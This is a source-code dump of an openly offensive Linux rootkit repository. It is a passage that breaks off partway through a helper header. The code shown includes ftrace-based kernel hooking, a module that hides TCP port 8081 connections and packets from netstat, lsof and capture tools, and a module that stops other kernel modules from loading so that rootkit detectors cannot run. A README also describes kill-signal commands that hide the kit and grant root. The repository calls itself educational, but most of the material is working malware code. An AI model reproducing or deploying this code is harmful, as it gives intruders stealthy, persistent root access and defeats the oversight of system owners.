Project Path: arc_MatheuZSecurity_Rootkit_ue1f9x3t

Source Tree:

```txt
arc_MatheuZSecurity_Rootkit_ue1f9x3t
â”œâ”€â”€ LICENSE
â”œâ”€â”€ README.md
â”œâ”€â”€ Ring0
â”‚   â”œâ”€â”€ Hiding-TCP-connections
â”‚   â”‚   â”œâ”€â”€ Makefile
â”‚   â”‚   â”œâ”€â”€ README.md
â”‚   â”‚   â”œâ”€â”€ ftrace_helper.h
â”‚   â”‚   â”œâ”€â”€ image.png
â”‚   â”‚   â””â”€â”€ netstat.c
â”‚   â”œâ”€â”€ Hooking-Insmod
â”‚   â”‚   â”œâ”€â”€ Makefile
â”‚   â”‚   â”œâ”€â”€ README.md
â”‚   â”‚   â”œâ”€â”€ ftrace_helper.h
â”‚   â”‚   â”œâ”€â”€ image.png
â”‚   â”‚   â””â”€â”€ insmod.c
â”‚   â”œâ”€â”€ Protecting-Files
â”‚   â”‚   â”œâ”€â”€ Makefile
â”‚   â”‚   â”œâ”€â”€ README.md
â”‚   â”‚   â”œâ”€â”€ ftrace_helper.h
â”‚   â”‚   â””â”€â”€ trev_kit.c
â”‚   â”œâ”€â”€ arm
â”‚   â”‚   â”œâ”€â”€ Makefile
â”‚   â”‚   â”œâ”€â”€ README.md
â”‚   â”‚   â”œâ”€â”€ ftrace_helper.h
â”‚   â”‚   â”œâ”€â”€ hook.c
â”‚   â”‚   â””â”€â”€ image.png
â”‚   â”œâ”€â”€ become_root
â”‚   â”‚   â”œâ”€â”€ Makefile
â”‚   â”‚   â”œâ”€â”€ README.md
â”‚   â”‚   â”œâ”€â”€ ftrace_helper.h
â”‚   â”‚   â”œâ”€â”€ hook.c
â”‚   â”‚   â””â”€â”€ image.png
â”‚   â”œâ”€â”€ clear-taint-dmesg
â”‚   â”‚   â”œâ”€â”€ Makefile
â”‚   â”‚   â”œâ”€â”€ README.md
â”‚   â”‚   â”œâ”€â”€ ftrace.h
â”‚   â”‚   â”œâ”€â”€ image.png
â”‚   â”‚   â”œâ”€â”€ kallsyms.jpg
â”‚   â”‚   â””â”€â”€ matheuz.c
â”‚   â”œâ”€â”€ device-root
â”‚   â”‚   â”œâ”€â”€ Makefile
â”‚   â”‚   â”œâ”€â”€ README.md
â”‚   â”‚   â”œâ”€â”€ device.c
â”‚   â”‚   â””â”€â”€ image.png
â”‚   â”œâ”€â”€ ftrace-protect
â”‚   â”‚   â”œâ”€â”€ Makefile
â”‚   â”‚   â”œâ”€â”€ Readme.md
â”‚   â”‚   â”œâ”€â”€ ftrace
â”‚   â”‚   â”‚   â””â”€â”€ ftrace.h
â”‚   â”‚   â”œâ”€â”€ hooks
â”‚   â”‚   â”‚   â”œâ”€â”€ read.h
â”‚   â”‚   â”‚   â””â”€â”€ write.h
â”‚   â”‚   â”œâ”€â”€ include
â”‚   â”‚   â”‚   â””â”€â”€ headers.h
â”‚   â”‚   â””â”€â”€ matheuz.c
â”‚   â”œâ”€â”€ hiding_directory
â”‚   â”‚   â”œâ”€â”€ Makefile
â”‚   â”‚   â”œâ”€â”€ README.md
â”‚   â”‚   â”œâ”€â”€ ftrace_helper.h
â”‚   â”‚   â”œâ”€â”€ image.png
â”‚   â”‚   â””â”€â”€ leviathan.c
â”‚   â”œâ”€â”€ persistent-thread
â”‚   â”‚   â”œâ”€â”€ Makefile
â”‚   â”‚   â”œâ”€â”€ README.md
â”‚   â”‚   â”œâ”€â”€ image.png
â”‚   â”‚   â””â”€â”€ lkm.c
â”‚   â”œâ”€â”€ reset-tainted
â”‚   â”‚   â”œâ”€â”€ Makefile
â”‚   â”‚   â”œâ”€â”€ README.md
â”‚   â”‚   â”œâ”€â”€ image.png
â”‚   â”‚   â””â”€â”€ tainted.c
â”‚   â””â”€â”€ thread-execution
â”‚       â”œâ”€â”€ Makefile
â”‚       â”œâ”€â”€ README.md
â”‚       â”œâ”€â”€ bebop.c
â”‚       â””â”€â”€ image.png
â”œâ”€â”€ Ring3
â”‚   â”œâ”€â”€ Hiding-from-etc-ld.so.preload
â”‚   â”‚   â”œâ”€â”€ README.md
â”‚   â”‚   â””â”€â”€ hide.c
â”‚   â”œâ”€â”€ hiding-directory
â”‚   â”‚   â”œâ”€â”€ README.md
â”‚   â”‚   â””â”€â”€ hide.c
â”‚   â”œâ”€â”€ hiding-ldpreload-from-ldd-and-proc
â”‚   â”‚   â”œâ”€â”€ README.md
â”‚   â”‚   â””â”€â”€ hide.c
â”‚   â”œâ”€â”€ persistence-hooking-open
â”‚   â”‚   â”œâ”€â”€ README.md
â”‚   â”‚   â”œâ”€â”€ image.png
â”‚   â”‚   â””â”€â”€ open.c
â”‚   â”œâ”€â”€ ptrace.c
â”‚   â””â”€â”€ rootkit-restore-itself
â”‚       â”œâ”€â”€ README.md
â”‚       â””â”€â”€ persist.c
â”œâ”€â”€ eBPF
â”‚   â”œâ”€â”€ hook_mkdirat
â”‚   â”‚   â”œâ”€â”€ mkdirat.c
â”‚   â”‚   â””â”€â”€ run.sh
â”‚   â””â”€â”€ hook_unlinkat
â”‚       â”œâ”€â”€ README.md
â”‚       â”œâ”€â”€ ecc
â”‚       â”œâ”€â”€ ecli
â”‚       â”œâ”€â”€ hook.png
â”‚       â”œâ”€â”€ run.sh
â”‚       â””â”€â”€ unlinkat.c
â”œâ”€â”€ rootkit_persistence.sh
â””â”€â”€ x.png

```

`LICENSE`:

```
MIT License

Copyright (c) 2025 matheuz

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`README.md`:

```md
<div align="center">
  <img src="x.png" width="75%"><br><br>
   <h1>Rootkit</h1>
    <i>Collection of Linux Rootkit codes</i>
</div><br>

> [!Note]
> _Some of these codes I created were taken from my server called *Rootkit Researchers* that I shared with people on my server, if you want to join feel free to be part of the community._
Join Rootkit Community
> https://discord.gg/66N5ZQppU7

> [!Important]
> This repository is for educational and research purposes only; We are not responsible for damages caused by use, which should only occur in controlled environments, such as VMs, with consent and in accordance with the law.

Feel free to make pull requests.

```

`Ring0/Hiding-TCP-connections/Makefile`:

```
obj-m := netstat.o
CC = gcc -Wall 
KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

```

`Ring0/Hiding-TCP-connections/README.md`:

```md
# **Hiding TCP connections from `netstat` and `lsof`**

For an attacker, it is very important to remain persistent and stealthy on a machine, post-compromise, for example, hiding its connections. In this post we will learn how to hide a port, for example 8081, from commands like `lsof` and `netstat`, for this we need to hook the `tcp4_seq_show()` and `tcp6_seq_show()` functions.

Basically when the system tries to list TCP connections, `tcp4_seq_show` or `tcp6_seq_show` are called, but with hooks, these calls are redirected to `hooked_tcp4_seq_show` or `hooked_tcp6_seq_show`, which check the connection port (stored in the sock structure); if the port is 8081, the function returns 0, hiding the connection, while for other ports the original functions are called, ensuring normal display of the TCP connection.

<p align="center"><img src="image.png"></p>

```

`Ring0/Hiding-TCP-connections/ftrace_helper.h`:

```h
/*
 * Helper library for ftrace hooking kernel functions
 * Author: Harvey Phillips (xcellerator@gmx.com)
 * License: GPL
 * */

#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/*
 * On Linux kernels 5.7+, kallsyms_lookup_name() is no longer exported, 
 * so we have to use kprobes to get the address.
 * Full credit to @f0lg0 for the idea.
 */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

#define HOOK(_name, _hook, _orig)   \
{                   \
    .name = (_name),        \
    .function = (_hook),        \
    .original = (_orig),        \
}

/* We need to prevent recursive loops when hooking, otherwise the kernel will
 * panic and hang. The options are to either detect recursion by looking at
 * the function return address, or by jumping over the ftrace call. We use the 
 * first option, by setting USE_FENTRY_OFFSET = 0, but could use the other by
 * setting it to 1. (Ordinarily ftrace provides its own protections against
 * recursion, but it relies on saving return registers in $rip. We will likely
 * need the use of the $rip register in our hook, so we have to disable this
 * protection and implement our own).
 * */
#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

/* We pack all the information we need (name, hooking function, original function)
 * into this struct. This makes it easier for setting up the hook and just passing
 * the entire struct off to fh_install_hook() later on.
 * */
struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

/* Ftrace needs to know the address of the original function that we
 * are going to hook. As before, we just use kallsyms_lookup_name() 
 * to find the address in kernel memory.
 * */
static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
#ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
#endif
    hook->address = kallsyms_lookup_name(hook->name);

    if (!hook->address)
    {
        printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

#if USE_FENTRY_OFFSET
    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
    *((unsigned long*) hook->original) = hook->address;
#endif

    return 0;
}

/* See comment below within fh_install_hook() */
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
    regs->ip = (unsigned long) hook->function;
#else
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->function;
#endif
}

/* Assuming we've already set hook->name, hook->function and hook->original, we 
 * can go ahead and install the hook with ftrace. This is done by setting the 
 * ops field of hook (see the comment below for more details), and then using
 * the built-in ftrace_set_filter_ip() and register_ftrace_function() functions
 * provided by ftrace.h
 * */
int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    err = fh_resolve_hook_address(hook);
    if(err)
        return err;

    /* For many function hooks (especially non-trivial ones), the $rip
     * register gets modified, so we have to alert ftrace to this fact. This
     * is the reason for the SAVE_REGS and IP_MODIFY flags. However, we also
     * need to OR the RECURSION_SAFE flag (effectively turning it OFF) because
     * the built-in anti-recursion guard provided by ftrace is useless if
     * we're modifying $rip. This is why we have to implement our own checks
     * (see USE_FENTRY_OFFSET). */
    hook->ops.func = (ftrace_func_t)fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
	   | FTRACE_OPS_FL_RECURSION
            | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

/* Disabling our function hook is just a simple matter of calling the built-in
 * unregister_ftrace_function() and ftrace_set_filter_ip() functions (note the
 * opposite order to that in fh_install_hook()).
 * */
void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    }
}

/* To make it easier to hook multiple functions in one module, this provides
 * a simple loop over an array of ftrace_hook struct
 * */
int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err;
    size_t i;

    for (i = 0 ; i < count ; i++)
    {
        err = fh_install_hook(&hooks[i]);
        if(err)
            goto error;
    }
    return 0;

error:
    while (i != 0)
    {
        fh_remove_hook(&hooks[--i]);
    }
    return err;
}

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;

    for (i = 0 ; i < count ; i++)
        fh_remove_hook(&hooks[i]);
}

```

`Ring0/Hiding-TCP-connections/netstat.c`:

```c
#include <linux/module.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <linux/tcp.h>
#include <linux/kernel.h>
#include "ftrace_helper.h"

#define PORT 8081               // Defines the port to be hidden (8081)

MODULE_LICENSE("GPL");        
MODULE_AUTHOR("mtzsec");   
MODULE_AUTHOR("ByteKick");
MODULE_DESCRIPTION("Hiding connections from netstat and lsof and tcpdump"); 
MODULE_VERSION("1.0");        

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
static asmlinkage int (*ip_rcv_t)(struct sk_buff *skb, struct net_device *dev, 
        struct packet_type *pt, struct net_device *orig_dev);

static int (*orig_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev,
		struct packet_type *pt, struct net_device *orig_dev);

static int hooked_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
		struct packet_type *pt, struct net_device *orig_dev)
{
	struct iphdr *iph;
	struct ipv6hdr *ip6h;
	struct tcphdr *tcph;

	//for some reason loopback interface causes some crashes so just drop it
	if (!strncmp(dev->name, "lo", 2))
		return NET_RX_DROP;

	if (skb_linearize(skb)) goto out;

	if (skb->protocol == htons(ETH_P_IP)) {
		iph = ip_hdr(skb);
		if (iph->protocol == IPPROTO_TCP) {
			tcph = (void *)iph + iph->ihl * 4;
			if (ntohs(tcph->dest) == PORT || ntohs(tcph->source) == PORT) {
				printk(KERN_DEBUG "Port hidden!\n");
				return NET_RX_DROP;
			}
		}
    } else if (skb->protocol == htons(ETH_P_IPV6)) {
		ip6h = ipv6_hdr(skb);
		if (ip6h->nexthdr == IPPROTO_TCP) {
			tcph = (void *)ip6h + sizeof(*ip6h);
			if (ntohs(tcph->dest) == PORT || ntohs(tcph->source) == PORT) {
				printk(KERN_DEBUG "Port hidden!\n");
				return NET_RX_DROP;
			}
		}
	}
out:
	return orig_tpacket_rcv(skb, dev, pt, orig_dev);
}
static asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v)
{
    long ret;
    struct sock *sk = v;
    
    if (sk != (struct sock *)0x1 && sk->sk_num == PORT)
    {
        printk(KERN_DEBUG "Port hidden!\n");
        return 0;
    }

    ret = orig_tcp4_seq_show(seq, v);
    return ret;
}

static asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v)
{
    long ret;
    struct sock *sk = v;
    
    if (sk != (struct sock *)0x1 && sk->sk_num == PORT)
    {
        printk(KERN_DEBUG "Port hidden!\n");
        return 0;
    }

    ret = orig_tcp6_seq_show(seq, v);
    return ret;
}

static int hook_ip_rcv(struct sk_buff *skb, struct net_device *dev,struct packet_type *pt, struct net_device *orig_dev) {
struct iphdr *ip_header;

        if ( !skb ){
            goto origin;
        }
        
ip_header = ip_hdr(skb);

        if( !ip_header ){
            goto origin;
        }    
        
        switch(ip_header->protocol) {
                case IPPROTO_ICMP:
                        return 0;
        }
origin:
         return ip_rcv_t(skb, dev, pt, orig_dev);

}

static struct ftrace_hook new_hooks[] = {
    HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &orig_tcp6_seq_show),
	HOOK("tpacket_rcv", hooked_tpacket_rcv, &orig_tpacket_rcv),
    HOOK("ip_rcv",hook_ip_rcv,&ip_rcv_t),
};


static int __init hideport_init(void)
{
    int err; 
    err = fh_install_hooks(new_hooks, ARRAY_SIZE(new_hooks));
    if(err) 
        return err;

    return 0;
}

static void __exit hideport_exit(void)
{
    fh_remove_hooks(new_hooks, ARRAY_SIZE(new_hooks));
}

module_init(hideport_init);
module_exit(hideport_exit);

```

`Ring0/Hooking-Insmod/Makefile`:

```
obj-m := insmod.o
CC = gcc -Wall 
KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

```

`Ring0/Hooking-Insmod/README.md`:

```md
## Hooking insmod

In recent years, some hidden LKM hunters, such as `nitara2`, have emerged to detect hidden Linux kernel rootkits. We can prevent these LKMs from being loaded easily by hooking up the `init_module` and `finit_module` syscall. Below is a code example.

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("matheuzsec");
MODULE_DESCRIPTION("Hooking init_module and finit_module");
MODULE_VERSION("1.0");

static asmlinkage long (*hooked_init_module)(struct file *file, const char *uargs, unsigned long flags);
static asmlinkage long (*hooked_finit_module)(struct file *file, const char *uargs, unsigned long flags);

static asmlinkage long hook_init_module(struct file *file, const char *uargs, unsigned long flags) {
    return 0;
}

static asmlinkage long hook_finit_module(struct file *file, const char *uargs, unsigned long flags) {
    return 0;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_init_module", hook_init_module, &hooked_init_module),
    HOOK("__x64_sys_finit_module", hook_finit_module, &hooked_finit_module),
};

static int __init insmod_init(void) {
    int err;

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        return err;
    }

    return 0;
}

static void __exit insmod_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(insmod_init);
module_exit(insmod_exit);
```

<p align="center"><img src="image.png"></p>

This LKM hooks `init_module` and `finit_module`, replacing them with functions that return 0. `return 0` indicates success, but in doing so, they block the execution of the original logic necessary to load other LKMs, being thus, preventing new modules from being loaded.

```

`Ring0/Hooking-Insmod/ftrace_helper.h`:

```h
/*
 * Helper library for ftrace hooking kernel functions
 * Author: Harvey Phillips (xcellerator@gmx.com)
 * License: GPL
 * */

#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/*
 * On Linux kernels 5.7+, kallsyms_lookup_name() is no longer exported, 
 * so we have to use kprobes to get the address.
 * Full credit to @f0lg0 for the idea.
 */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

#define HOOK(_name, _hook, _orig)   \
{                   \
    .name = (_name),        \
    .function = (_hook),        \
    .original = (_orig),        \
}

/* We need to prevent recursive loops when hooking, otherwise the kernel will
 * panic and hang. The options are to either detect recursion by looking at
 * the function return address, or by jumping over the ftrace call. We use the 
 * first option, by setting USE_FENTRY_OFFSET = 0, but could use the other by
 * setting it to 1. (Ordinarily ftrace provides its own protections against
 * recursion, but it relies on saving return registers in $rip. We will likely
 * need the use of the $rip register in our hook, so we have to disable this
 * protection and implement our own).
 * */
#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

/* We pack all the information we need (name, hooking function, original function)
 * into this struct. This makes it easier for setting up the hook and just passing
 * the entire struct off to fh_install_hook() later on.
 * */
struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

/* Ftrace needs to know the address of the original function that we
 * are going to hook. As before, we just use kallsyms_lookup_name() 
 * to find the address in kernel memory.
 * */
static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
#ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
#endif
    hook->address = kallsyms_lookup_name(hook->name);

    if (!hook->address)
    {
        printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

#if USE_FENTRY_OFFSET
    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
    *((unsigned long*) hook->original) = hook->address;
#endif

    return 0;
}

/* See comment below within fh_install_hook() */
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
    regs->ip = (unsigned long) hook->function;
#else
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->function;
#endif
}

/* Assuming we've already set hook->name, hook->function and hook->original, we 
 * can go ahead and install the hook with ftrace. This is done by setting the 
 * ops field of hook (see the comment below for more details), and then using
 * the built-in ftrace_set_filter_ip() and register_ftrace_function() functions
 * provided by ftrace.h
 * */
int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    err = fh_resolve_hook_address(hook);
    if(err)
        return err;

    /* For many function hooks (especially non-trivial ones), the $rip
     * register gets modified, so we have to alert ftrace to this fact. This
     * is the reason for the SAVE_REGS and IP_MODIFY flags. However, we also
     * need to OR the RECURSION_SAFE flag (effectively turning it OFF) because
     * the built-in anti-recursion guard provided by ftrace is useless if
     * we're modifying $rip. This is why we have to implement our own checks
     * (see USE_FENTRY_OFFSET). */
    hook->ops.func = (ftrace_func_t)fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
	   | FTRACE_OPS_FL_RECURSION
            | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

/* Disabling our function hook is just a simple matter of calling the built-in
 * unregister_ftrace_function() and ftrace_set_filter_ip() functions (note the
 * opposite order to that in fh_install_hook()).
 * */
void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    }
}

/* To make it easier to hook multiple functions in one module, this provides
 * a simple loop over an array of ftrace_hook struct
 * */
int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err;
    size_t i;

    for (i = 0 ; i < count ; i++)
    {
        err = fh_install_hook(&hooks[i]);
        if(err)
            goto error;
    }
    return 0;

error:
    while (i != 0)
    {
        fh_remove_hook(&hooks[--i]);
    }
    return err;
}

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;

    for (i = 0 ; i < count ; i++)
        fh_remove_hook(&hooks[i]);
}

```

`Ring0/Hooking-Insmod/insmod.c`:

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("matheuzsec");
MODULE_DESCRIPTION("Hooking init_module and finit_module");
MODULE_VERSION("1.0");

static asmlinkage long (*hooked_init_module)(struct file *file, const char *uargs, unsigned long flags);
static asmlinkage long (*hooked_finit_module)(struct file *file, const char *uargs, unsigned long flags);

static asmlinkage long hook_init_module(struct file *file, const char *uargs, unsigned long flags) {
    return 0;
}

static asmlinkage long hook_finit_module(struct file *file, const char *uargs, unsigned long flags) {
    return 0;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_init_module", hook_init_module, &hooked_init_module),
    HOOK("__x64_sys_finit_module", hook_finit_module, &hooked_finit_module),
};

static int __init insmod_init(void) {
    int err;

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        return err;
    }

    return 0;
}

static void __exit insmod_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(insmod_init);
module_exit(insmod_exit);

```

`Ring0/Protecting-Files/Makefile`:

```
obj-m := trev_kit.o 
CC = gcc -Wall 
KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

```

`Ring0/Protecting-Files/README.md`:

```md


# Trev Kit

## ðŸ“Œ Overview


This kernel module demonstrates how to use ftrace hooking to intercept and modify the behavior of Linux system calls.
It hooks the following syscalls:

- write â†’ Alters the contents of a specific file (/root/data.txt)
- mount â†’ Blocks mounting of certain paths
- kill â†’ Provides hidden commands for toggling module visibility and privilege escalation

### The Kill Hook 

- The kit will hook the kill sys call to escalate privileges and to make the kit visible (e.g: in `lsmod`)
```bash
kill -44 0 # hides or shows the kit
kill -45 0 # sets root
```

 ### The Write Hook 

 - The write hook will protect the content of the file under the constant `TARGET_FILE` therefore, preventing modifications to this file even by root user
 - The static content of the file is under `DATA` constant hence, only that specific data will be inside that file
```bash
cat /root/data.txt
Hello World
```
- File size is forced to `DATA_LEN` bytes
- Reads beyond this length return 0 (EOF) 

### The Mount Hook 

2. Blocking Mounts (Hooking mount)

Prevents mounting sensitive paths:

```bash
/root/data.txt
/root
/
```
If either source or target is one of these, the call is denied. 

```

`Ring0/Protecting-Files/ftrace_helper.h`:

```h

/*  
 * Helper library for ftrace hooking kernel functions
 * Author: Harvey Phillips (xcellerator@gmx.com)
 * License: GPL
 * */

#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/*
 * On Linux kernels 5.7+, kallsyms_lookup_name() is no longer exported, 
 * so we have to use kprobes to get the address.
 * Full credit to @f0lg0 for the idea.
 */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

#define HOOK(_name, _hook, _orig)   \
{                   \
    .name = (_name),        \
    .function = (_hook),        \
    .original = (_orig),        \
}

/* We need to prevent recursive loops when hooking, otherwise the kernel will
 * panic and hang. The options are to either detect recursion by looking at
 * the function return address, or by jumping over the ftrace call. We use the 
 * first option, by setting USE_FENTRY_OFFSET = 0, but could use the other by
 * setting it to 1. (Ordinarily ftrace provides its own protections against
 * recursion, but it relies on saving return registers in $rip. We will likely
 * need the use of the $rip register in our hook, so we have to disable this
 * protection and implement our own).
 * */
#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

/* We pack all the information we need (name, hooking function, original function)
 * into this struct. This makes it easier for setting up the hook and just passing
 * the entire struct off to fh_install_hook() later on.
 * */
struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

/* Ftrace needs to know the address of the original function that we
 * are going to hook. As before, we just use kallsyms_lookup_name() 
 * to find the address in kernel memory.
 * */
static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
#ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
#endif
    hook->address = kallsyms_lookup_name(hook->name);

    if (!hook->address)
    {
        printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

#if USE_FENTRY_OFFSET
    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
    *((unsigned long*) hook->original) = hook->address;
#endif

    return 0;
}

/* See comment below within fh_install_hook() */
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
    regs->ip = (unsigned long) hook->function;
#else
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->function;
#endif
}

/* Assuming we've already set hook->name, hook->function and hook->original, we 
